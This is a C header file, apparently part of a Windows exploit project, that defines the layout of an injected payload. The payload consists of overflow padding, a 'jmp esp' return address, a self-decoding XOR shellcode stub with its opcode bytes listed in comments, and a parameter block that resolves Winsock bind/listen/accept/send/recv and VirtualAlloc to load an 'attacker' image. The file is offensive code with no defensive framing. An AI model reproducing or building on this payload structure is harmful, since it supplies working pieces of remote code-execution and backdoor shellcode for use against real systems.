#include "Attacker.h"

#pragma once

typedef SOCKET (WINAPI *Fxsocket)(int af, int type, int protocol);
typedef int (WINAPI *Fxbind)(SOCKET s, const struct sockaddr* name, int namelen);
typedef int (WINAPI *Fxlisten)(SOCKET s, int backlog);
typedef SOCKET (WINAPI *Fxaccept)(SOCKET s, struct sockaddr* addr, int* addrlen);
typedef int (WINAPI *Fxsend)(SOCKET s, const char* buf, int len, int flags);
typedef int (WINAPI *Fxrecv)(SOCKET s, char* buf, int len, int flags);
typedef LPVOID (WINAPI *FxVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);


#pragma pack(push)
#pragma pack(1)

struct STUBSTUBCODE
{
	BYTE arrConst1[4];	//0x33, 0xC9, 0x66, 0xB9
	WORD wXorSize;		//0x0137,需要进行异或处理的数据的大小
	BYTE arrConst2[3];	//0x8D, 0x74, 0x24
	BYTE byXorOffset;	//需要进行异或处理的代码的起始位置(相对于esp的偏移)
	BYTE arrConst3[4];	//0x56, 0x8A, 0x06, 0x34
	BYTE byXorMask;		//使用此数字进行异或
	BYTE arrConst4[8];	//0x88,	0x06, 0x46, 0xE2, 0xF7, 0x8D, 0x44, 0x24
	BYTE byEntryOffset;	//STUB代码的入口地址(相对于esp的偏移)
	BYTE arrConst5[2];	//0xFF, 0xD0
};

struct STUBPARAM
{
	FxLoadLibrary fnLoadLibrary;
	FxGetProcAddr fnGetProcAddr;
	FxVirtualAlloc fnVirtualAlloc;
	DWORD dwImageSize;
	DWORD RvaAttackerEntry;
	char szWs2_32[11];		//ws2_32.dll
	char szSocket[7];		//socket
	char szBind[5];			//bind
	char szListen[7];		//listen
	char szAccept[7];		//accept
	char szSend[5];			//send
	char szRecv[5];			//recv
};


struct STUB
{
	BYTE arrPadding1[18];
	DWORD dwJmpEsp;
	BYTE arrPadding2[4];
	STUBSTUBCODE ssc;
	STUBPARAM sp;
	BYTE arrStubCode[1];	//in fact it is a varible size array
};

#pragma pack(pop)